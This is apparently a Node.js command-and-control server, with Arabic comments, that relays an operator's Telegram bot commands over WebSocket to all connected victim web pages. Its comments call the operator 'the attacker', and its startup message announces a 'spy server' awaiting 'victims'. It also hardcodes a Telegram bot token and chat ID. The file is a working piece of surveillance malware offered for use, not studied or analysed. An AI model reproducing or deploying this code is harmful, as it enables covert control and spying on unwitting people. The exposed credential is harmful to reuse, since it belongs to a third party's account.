// server.js
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// ========== إعداداتك ==========
const BOT_TOKEN = '8573086497:AAH6daFBxrgYIplpagMJrM5RNKqGLDAvXSY';
const YOUR_CHAT_ID = '6897156984';

// ========== تهيئة البوت ==========
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ========== خادم Express ==========
const app = express();
app.use(express.static(path.join(__dirname, 'public')));
const server = http.createServer(app);

// ========== WebSocket Server ==========
const wss = new WebSocket.Server({ server });
let activeClients = new Map(); // key: socket, value: { chatId, botToken? }

wss.on('connection', (ws, req) => {
    console.log('[WS] New client connected');
    activeClients.set(ws, {});
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            if (msg.type === 'register') {
                // تسجيل الصفحة مع معرف المهاجم (يمكن التحقق)
                const clientInfo = activeClients.get(ws);
                clientInfo.chatId = msg.chatId || YOUR_CHAT_ID;
                activeClients.set(ws, clientInfo);
                console.log('[WS] Registered client for chat', clientInfo.chatId);
                ws.send(JSON.stringify({ status: 'registered' }));
            }
        } catch(e) { console.error(e); }
    });
    
    ws.on('close', () => {
        activeClients.delete(ws);
        console.log('[WS] Client disconnected');
    });
});

// ========== معالجة أوامر التليجرام ==========
bot.onText(/^\/(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    // فقط المهاجم المسموح له
    if (chatId.toString() !== YOUR_CHAT_ID) {
        bot.sendMessage(chatId, 'أنت غير مصرح لك باستخدام هذا البوت.');
        return;
    }
    
    const fullCommand = match[1];
    const command = fullCommand.split(' ')[0]; // الأمر الأساسي
    const args = fullCommand.split(' ').slice(1);
    
    console.log(`[TG] Command received: ${command}`);
    
    // إرسال الأمر إلى جميع الصفحات المتصلة
    let sentCount = 0;
    for (let [ws, info] of activeClients.entries()) {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
                command: command,
                args: args,
                sender: chatId
            }));
            sentCount++;
        }
    }
    
    if (sentCount === 0) {
        bot.sendMessage(chatId, '⚠️ لا توجد صفحات متصلة حاليًا.');
    } else {
        bot.sendMessage(chatId, `✅ تم إرسال الأمر "${command}" إلى ${sentCount} صفحة.`);
    }
});

// ========== تشغيل الخادم ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    bot.sendMessage(YOUR_CHAT_ID, '🔥 خادم التجسس بدأ العمل. انتظر اتصال الضحايا.');
});
